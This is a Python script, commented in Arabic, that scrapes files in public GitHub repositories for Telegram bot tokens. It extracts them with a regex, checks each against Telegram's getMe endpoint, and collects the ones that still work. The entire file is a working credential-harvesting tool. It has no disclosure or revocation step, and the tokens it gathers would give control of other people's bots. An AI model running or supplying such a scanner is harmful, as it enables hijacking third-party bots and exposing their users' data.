import re
import os
import logging
import requests
from github import Github, RateLimitExceededException

# إعداد السجلات (Logs)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

# ذاكرة مؤقتة لمنع التكرار في الجلسة الواحدة
session_seen_tokens = set()

def is_valid_token(token):
    """
    وظيفة الفلترة: التحقق من أن التوكن يخص بوت تليجرام نشط.
    تستخدم GET /getMe (طريقة سلبية لا تؤثر على البوت).
    """
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5)
        # إذا كان الرد 200، فالتوكن صالح
        return response.status_code == 200
    except Exception:
        return False

def search_for_tokens():
    """
    محرك الصيد المتكامل مع نظام الفلترة
    """
    found_tokens = []
    logger.info("Scanner Engine: Starting search sequence with active filtering...")

    try:
        # البحث في المستودعات
        repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:20]
        
        for repo in repositories:
            # تجاهل المستودعات الضعيفة
            if repo.stargazers_count < 5:
                continue
            
            try:
                contents = repo.get_contents("")
                for content in contents:
                    # فحص الملفات
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt')):
                        file_content = content.decoded_content.decode('utf-8', errors='ignore')
                        
                        # استخراج التوكنات
                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                        
                        for token in set(tokens):
                            # إذا كان جديداً ولم نره من قبل
                            if token not in session_seen_tokens:
                                # الفلترة: هل هذا التوكن يعمل فعلاً؟
                                if is_valid_token(token):
                                    session_seen_tokens.add(token)
                                    found_tokens.append(token)
                                    logger.info(f"Verified & Valid token found in {repo.full_name}")
                                else:
                                    logger.info(f"Filtered out invalid token from {repo.full_name}")
            
            except Exception:
                continue
                
    except RateLimitExceededException:
        logger.warning("GitHub API limit reached!")
    except Exception as e:
        logger.error(f"Scanner Critical Error: {e}")
        
    logger.info(f"Scanner Cycle Complete. Found {len(found_tokens)} valid new tokens.")
    return found_tokens
